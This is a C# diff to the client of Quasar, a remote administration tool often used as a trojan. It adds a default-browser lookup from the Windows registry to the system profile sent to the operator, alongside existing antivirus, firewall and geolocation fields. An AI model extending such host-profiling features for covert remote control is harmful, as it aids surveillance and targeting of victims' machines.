@@ -10,6 +10,7 @@ using System.Net.NetworkInformation;
 using Quasar.Client.IO;
 using Quasar.Common.Messages.Administration.SystemInfo;
 using Quasar.Common.Messages.other;
+using Microsoft.Win32;
 
 namespace Quasar.Client.Messages
 {
@@ -40,6 +41,7 @@ namespace Quasar.Client.Messages
 
                 var geoInfo = GeoInformationFactory.GetGeoInformation();
                 var userAccount = new UserAccount();
+                string defaultBrowser = GetDefaultBrowser();
 
                 List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                 {
@@ -61,7 +63,8 @@ namespace Quasar.Client.Messages
                     new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
                     new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                     new Tuple<string, string>("Time Zone", geoInfo.Timezone),
-                    new Tuple<string, string>("Country", geoInfo.Country)
+                    new Tuple<string, string>("Country", geoInfo.Country),
+                    new Tuple<string, string>("Main Browser", defaultBrowser) // Adding the default browser to tuple 
                 };
 
                 client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
@@ -69,6 +72,42 @@ namespace Quasar.Client.Messages
             catch
             {
             }
+        }
+        private string GetDefaultBrowser() // Get the default browser you dumb ass
+        {
+            try
+            {
+                string registryKey = @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice";
+                using (RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(registryKey))
+                {
+                    if (key != null)
+                    {
+                        var browserProgId = key.GetValue("ProgId")?.ToString();
+                        if (browserProgId != null)
+                        {
+                            return GetBrowserNameFromProgId(browserProgId);
+                        }
+                    }
+                }
+            }
+            catch
+            {
+            }
+
+            return "-";
+        }
+
+        private string GetBrowserNameFromProgId(string progId) // just read what it says
+        {
+            var browserMappings = new Dictionary<string, string>
+            {
+                { "FirefoxURL", "Mozilla Firefox" },
+                { "ChromeHTML", "Google Chrome" },
+                { "MSEdgeHTM", "Microsoft Edge" },
+                { "OperaStable", "Opera" }
+            };
+
+            return browserMappings.ContainsKey(progId) ? browserMappings[progId] : "Unknown Browser";
         }
     }
 }
